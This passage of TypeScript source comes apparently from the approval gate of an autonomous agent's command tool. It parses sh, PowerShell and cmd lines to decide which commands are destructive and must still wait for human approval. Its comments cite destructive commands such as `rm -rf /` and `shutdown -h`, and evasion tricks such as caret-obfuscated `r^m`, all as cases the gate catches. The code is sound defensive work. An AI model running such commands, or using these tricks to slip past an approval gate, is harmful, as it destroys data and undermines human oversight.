        if (seen.has(key)) return false;
        seen.add(key);
        return true;
      },
    );
  }
  if (depth > 8 || typeof cmd !== 'string' || cmd.trim() === '') return [];
  const units: string[][] = [];
  // Substitutions run even inside double quotes: `$(…)` in sh and PowerShell,
  // backticks in sh (PowerShell's backtick is its escape, cmd has neither).
  if (shell !== 'cmd' && shell !== 'exec') {
    const substitution = shell === 'sh' ? /\$\(([^()]*)\)|`([^`]*)`/g : /\$\(([^()]*)\)/g;
    for (const m of cmd.matchAll(substitution))
      units.push(...commandUnits(m[1] ?? m[2] ?? '', depth + 1, shell));
  }
  for (const words of splitQuotedShellWords(cmd, shell))
    units.push(...wordUnits(words, depth, shell));
  return units;
}

/** The shell that reads a `run_command` line on this host; unknown → both (`commandUnits`). */
function topShell(host: ShellHost | undefined): LineShell | undefined {
  return host === undefined ? undefined : host === 'windows' ? 'cmd' : 'sh';
}

/** The units of one command, given as its words. */
function wordUnits(
  words: readonly ShellWord[],
  depth: number,
  shell: LineShell,
  invoked = false,
): string[][] {
  if (depth > 8) return [];
  // `FOO=1 rm -rf build`: variables set for the command are not the program
  // (review of PR #476).
  let k = 0;
  while (k < words.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[k]?.text ?? '')) k += 1;
  const head = words[k];
  if (head === undefined) return [];
  // In PowerShell a statement that starts with `$` is an expression, not a
  // command: it runs a program only through `&` or `.` (`invoked`). Its
  // assignment runs what its right side names when that is a command
  // (`$r = Invoke-RestMethod x`), never a string or a value (`$c = 'lpr'`).
  if (shell === 'powershell' && !invoked && head.text.startsWith('$')) {
    const tail =
      head.tail ??
      words
        .slice(k)
        .map((w) => w.text)
        .join(' ');
    const eq = tail.indexOf('=');
    const right = eq < 0 ? '' : tail.slice(eq + 1).trim();
    return eq < 0 || /^[$'"(@\[\d-]/.test(right) || right === ''
      ? []
      : commandUnits(right, depth + 1, 'powershell');
  }
  // A program the text does not name (#667, review of PR #682, pass 4) keeps
  // its words, so it is never taken for a program it may not be; one written
  // with a path is that file, never the shell's keyword of the same name.
  const program =
    isDecidedAtRunTime(head.text) ||
    (/[\\/]/.test(head.text) && SHELL_KEYWORDS.has(interpreterBasename(head.text)))
      ? head.text.toLowerCase()
      : interpreterBasename(head.text);
  const args =
    program === 'start' && shell === 'cmd'
      ? withoutStartTitle(words.slice(k + 1))
      : words.slice(k + 1);
  const texts = args.map((a) => a.text);
  const units: string[][] = [[program, ...texts]];
  // `python -m pip install x` runs pip: the module is the program (review of
  // PR #476; main caught it by reading the whole text).
  if (interpreterKind(program) === 'python') {
    const m = texts.map((t) => t.toLowerCase()).indexOf('-m');
    const module = m >= 0 ? texts[m + 1] : undefined;
    if (module !== undefined) units.push([module.toLowerCase(), ...texts.slice(m + 2)]);
  }
  for (const payload of RUNS_ANOTHER[program]?.(args, shell) ?? []) {
    units.push(
      ...('line' in payload
        ? commandUnits(payload.line, depth + 1, payload.shell)
        : wordUnits(payload.words, depth + 1, payload.shell, payload.invoked === true)),
    );
  }
  return units;
}

/**
 * A command cut into its commands and each into words, quotes honoured and
 * removed: `python a.py "C:/My Files/x.csv"` is three words, not four.
 * Redirection targets are words too. Read as `shell` reads it (sh by default).
 */
export function splitShellWords(cmd: string, shell: LineShell = 'sh'): string[][] {
  return splitQuotedShellWords(cmd, shell).map((segment) => segment.map((w) => w.text));
}

/**
 * One word of a command: its text, whether it was written in quotes (cmd's
 * `start` title), and the raw text of the command from it on (what `cmd /c`
 * hands cmd to read again).
 */
interface ShellWord {
  text: string;
  quoted: boolean;
  tail?: string;
}

/**
 * The grammar of a shell that reads a line: what ends a command, what quotes,
 * what escapes (review of PR #682, pass 3). Unquoted `(` `)` `{` `}` are
 * operators where the shell has them: a command starts after an opening one,
 * glued or not (`(rm -rf /)`, `{ lpr x; }`, `ForEach-Object { Remove-Item $_ }`).
 */
interface Grammar {
  /** Characters that end a command outside quotes. */
  separators: string;
  /** Characters that open a quoted span. */
  quotes: string;
  /** The escape character outside quotes, if the shell has one. */
  escape: string | null;
  /** Inside double quotes: does `ch` escape the character after it? */
  escapesInDouble: (ch: string, next: string) => boolean;
  /** A quote written twice inside its span is that quote (`'it''s'`, `"say ""hi"""`). */
  doubledQuote: boolean;
}

/** sh: `\` escapes, single quotes are literal, `\` escapes only `"\$`` ` inside double quotes. */
const SH: Grammar = {
  separators: ';&|\n\r(){}',
  quotes: `"'`,
  escape: '\\',
  escapesInDouble: (ch, next) => ch === '\\' && '"\\$`'.includes(next),
  doubledQuote: false,
};

/** PowerShell: the backtick escapes, a quote is doubled inside its span, `&` calls a command. */
const POWERSHELL: Grammar = {
  separators: ';&|\n\r(){}',
  quotes: `"'`,
  escape: '`',
  escapesInDouble: (ch) => ch === '`',
  doubledQuote: true,
};

/** `splitShellWords`, each word saying whether it was quoted, for the shell that reads the line. */
function splitQuotedShellWords(cmd: string, shell: LineShell): ShellWord[][] {
  switch (shell) {
    case 'sh':
      return scanLine(cmd, SH);
    case 'powershell':
      return scanLine(cmd, POWERSHELL);
    case 'cmd':
      return cmdCommands(cmd).map(windowsArguments);
    case 'exec':
      // A command line handed to a program, no shell: no operator, its words
      // by the Windows argument rules (`runas "prog args"`).
      return [windowsArguments(cmd)].filter((words) => words.length > 0);
  }
}

/** Read a line with the grammar of sh or PowerShell, words and commands in one pass. */
function scanLine(line: string, g: Grammar): ShellWord[][] {
  const segments: ShellWord[][] = [];
  let words: Array<{ text: string; quoted: boolean; start: number }> = [];
  let word = '';
  let inWord = false;
  let quoted = false;
  let start = 0;
  let quote: string | null = null;
  const begin = (at: number): void => {
    if (!inWord) {
      inWord = true;
      start = at;
    }
  };
  const endWord = (): void => {
    if (inWord) words.push({ text: word, quoted, start });
    word = '';
    inWord = false;
    quoted = false;
  };
  const endCommand = (at: number): void => {
    endWord();
    if (words.length > 0)
      segments.push(
        words.map((w) => ({ text: w.text, quoted: w.quoted, tail: line.slice(w.start, at) })),
      );
    words = [];
  };
  for (let at = 0; at < line.length; at++) {
    const ch = line[at] ?? '';
    const next = line[at + 1] ?? '';
    if (quote !== null) {
      if (ch === quote) {
        if (g.doubledQuote && next === quote) {
          word += quote;
          at += 1;
        } else quote = null;
      } else if (quote === '"' && g.escapesInDouble(ch, next)) {
        word += next;
        at += 1;
      } else word += ch;
      continue;
    }
    if (g.quotes.includes(ch)) {
      begin(at);
      quote = ch;
      quoted = true;
    } else if (ch === g.escape) {
      begin(at);
      word += next;
      at += 1;
    } else if (g.separators.includes(ch)) {
      endCommand(at);
      // PowerShell's call operator starts a command whose program follows it;
      // before a parenthesised expression, that program is decided at run time.
      if (g === POWERSHELL && ch === '&' && next !== '&') {
        const after = line.slice(at + 1).trimStart();
        words.push({ text: '&', quoted: false, start: at });
        if (after.startsWith('(')) words.push({ text: '$(…)', quoted: false, start: at });
      }
    } else if (/\s/.test(ch) || ch === '<' || ch === '>') {
      endWord();
    } else {
      begin(at);
      word += ch;
    }
  }
  endCommand(line.length);
  return segments;
}

/**
 * cmd.exe's commands: `&`, `|`, newlines and its `( )` blocks end one,
 * outside quotes; a double quote toggles a quoted span (a single quote is a
 * character, a backslash is a character: cmd has no backslash escape); `^`
 * escapes the next character outside quotes and is removed (`r^m` runs `rm`).
 * Each command keeps its raw text: the program reads its own words.
 */
function cmdCommands(line: string): string[] {
  const commands: string[] = [];
  let current = '';
  let inQuote = false;
  for (let at = 0; at < line.length; at++) {
    const ch = line[at] ?? '';
    if (ch === '"') {
      inQuote = !inQuote;
      current += ch;
    } else if (inQuote) {
      current += ch;
    } else if (ch === '^') {
      current += line[at + 1] ?? '';
      at += 1;
    } else if ('&|\n\r()'.includes(ch)) {
      commands.push(current);
      current = '';
    } else current += ch;
  }
  commands.push(current);
  return commands.filter((c) => c.trim() !== '');
}

/**
 * The words of a Windows command line, as a program reads its arguments
 * (CommandLineToArgvW): spaces split outside quotes, a double quote toggles,
 * `2n` backslashes before a quote are `n` and the quote toggles, `2n+1` are
 * `n` and a literal quote, other backslashes are characters (`C:\x`), and `""`
 * inside quotes is a quote. `<` and `>` end a word (redirections).
 */
function windowsArguments(line: string): ShellWord[] {
  const words: ShellWord[] = [];
  let at = 0;
  while (at < line.length) {
    while (at < line.length && /[\s<>]/.test(line[at] ?? '')) at += 1;
    if (at >= line.length) break;
    const start = at;
    let text = '';
    let quoted = false;
    let inQuote = false;
    while (at < line.length) {
      const ch = line[at] ?? '';
      if (!inQuote && /[\s<>]/.test(ch)) break;
      if (ch === '\\') {
        let n = 0;
        while (line[at + n] === '\\') n += 1;
        if (line[at + n] === '"') {
          text += '\\'.repeat(Math.floor(n / 2));
          if (n % 2 === 1) {
            text += '"';
            at += n + 1;
          } else at += n;
        } else {
          text += '\\'.repeat(n);
          at += n;
        }
        continue;
      }
      if (ch === '"') {
        quoted = true;
        if (inQuote && line[at + 1] === '"') {
          text += '"';
          at += 2;
          continue;
        }
        inQuote = !inQuote;
        at += 1;
        continue;
      }
      text += ch;
      at += 1;
    }
    words.push({ text, quoted, tail: line.slice(start) });
  }
  return words;
}

/**
 * True when `cmd` performs a destructive or heavy, hard-to-undo action. Used by
 * the `destructive_gate` autonomy level: such a command keeps its approval gate
 * while ordinary commands auto-run. Catastrophic commands are a subset (always
 * true here too).
 */
export function isDestructiveOrHeavyCommand(cmd: string, host?: ShellHost): boolean {
  if (typeof cmd !== 'string' || cmd.trim() === '') return false;
  // Catastrophic (machine-destroyers) and opaque interpreter-eval both keep
  // their gate under destructive_gate. Inline-eval is no longer catastrophic
  // (approvable), but it stays "heavy" here so destructive_gate still asks a
  // human before running an un-inspectable one-liner.
  if (isCatastrophicCommand(cmd, host) || isInlineInterpreterEvalCommand(cmd, host)) return true;
  // Every program only asked for its version or help: nothing happens.
  const units = commandUnits(withoutRedirections(cmd), 0, topShell(host));
  const working = units.filter((u) => !runsAnother(u));
  if (working.length > 0 && working.every(isReadUnit)) return false;
  const c = normalizeSlashes(cmd.trim());
  return (
    DESTRUCTIVE_PATTERNS.some((re) => re.test(c)) ||
    units.some((u) => curlWritesAFile(u) || unitCategories(u).includes('open_or_send'))
  );
}

/** The read flags the catastrophic floor lets through: never `-h` (`shutdown -h` halts). */
const FLOOR_READ_FLAGS = new Set(['--help', '--version', '/?']);

/** The flags that make a program print its version or its help, and exit. */
const VERSION_OR_HELP = new Set(['--version', '-V', '--help', '-h', '-?', '/?']);

/**
 * A program called only for its version or its help (`aria2c --version`,
 * `wget -h`) prints and exits: it is no kind of action, whatever the program
 * does otherwise (Reviewer A, #582; the class of #552, a read taken for the
 * action it is about). One more word, an URL or a subcommand, and it is the
 * program at work again.
 */
function isVersionOrHelpOnly(unit: readonly string[]): boolean {
  return unit.length >= 2 && unit.slice(1).every((t) => VERSION_OR_HELP.has(t));
}

/**
 * The help of a SUBCOMMAND: words, then only version or help flags (`pip
 * download --help`, `comfy model download --help`, `ollama pull llama3 -h`).
 */
function isSubcommandHelp(unit: readonly string[]): boolean {
  const args = unit.slice(1);
  const firstFlag = args.findIndex((t) => t.startsWith('-') || t.startsWith('/'));
  if (firstFlag <= 0) return false;
  return args.slice(firstFlag).every((t) => VERSION_OR_HELP.has(t));
}

/**
 * The kinds whose programs all print the help of a subcommand and exit: the
 * fetchers and installers (pip, npm, comfy, docker, git, hf, ollama, wget…).
 * Not the others: cmd's `del` and `rd` read `--help` as one more file name,
 * bash's `kill` still sends its signal (Reviewer A, #582 pass 2).
 */
const SUBCOMMAND_HELP_EXCUSES: ReadonlySet<StaticShellCategory> = new Set([
  'download',
  'install_software',
]);

/** The kinds of one command unit, read from its patterns, before any excuse. */
function patternKinds(unit: readonly string[]): Array<keyof typeof STATIC_SHELL_CATEGORY_PATTERNS> {
  const text = normalizeSlashes(unit.join(' '));
  return (
    Object.entries(STATIC_SHELL_CATEGORY_PATTERNS) as Array<
      [keyof typeof STATIC_SHELL_CATEGORY_PATTERNS, readonly RegExp[]]
    >
  )
    .filter(
      ([category, patterns]) =>
        patterns.some((re) => startsWithMatch(re, text)) ||
        (category === 'download' && curlWritesAFile(unit)),
    )
    .map(([category]) => category);
}

/**
 * A `curl` that writes a file: the same reading as where it writes
 * (`fetcherTargets`), so the kind and the target never disagree (#614, revue
 * Nodal de la PR #618, passe 3 : `-sLoC:\x` échappait aux deux).
 */
function curlWritesAFile(unit: readonly string[]): boolean {
  return unit[0] === 'curl' && fetcherTargets('curl', unit.slice(1)).length > 0;
}

/** The kinds one command unit performs: none for a version or help check. */
function unitCategories(unit: readonly string[]): StaticShellCategory[] {
  if (isVersionOrHelpOnly(unit)) return [];
  const kinds: StaticShellCategory[] = patternKinds(unit);
  if (reachesOut(unit)) kinds.push('open_or_send');
  return isSubcommandHelp(unit) ? kinds.filter((k) => !SUBCOMMAND_HELP_EXCUSES.has(k)) : kinds;
}

/** A unit that only prints: a version or help check, or the help of a fetch or install subcommand. */
function isReadUnit(unit: readonly string[]): boolean {
  if (isVersionOrHelpOnly(unit)) return true;
  if (!isSubcommandHelp(unit)) return false;
  const kinds = patternKinds(unit);
  return kinds.length > 0 && kinds.every((k) => SUBCOMMAND_HELP_EXCUSES.has(k));
}

/**
 * The command with its redirections removed (`2>&1`, `> /dev/null`, `>> log`,
 * `< in`): they are the shell's, not the program's arguments, and the
 * tokenizer kept their fd and target as words (`wget --version 2>&1` read
 * as `wget --version 2` then `1`).
 */
function withoutRedirections(cmd: string): string {
  return cmd.replace(
    /(^|\s)(?:\d|&|\*)?(?:>>?|<)(?:&\d+|\s*(?:"[^"]*"|'[^']*'|[^\s;&|()<>]+))/g,
    '$1',
  );
}
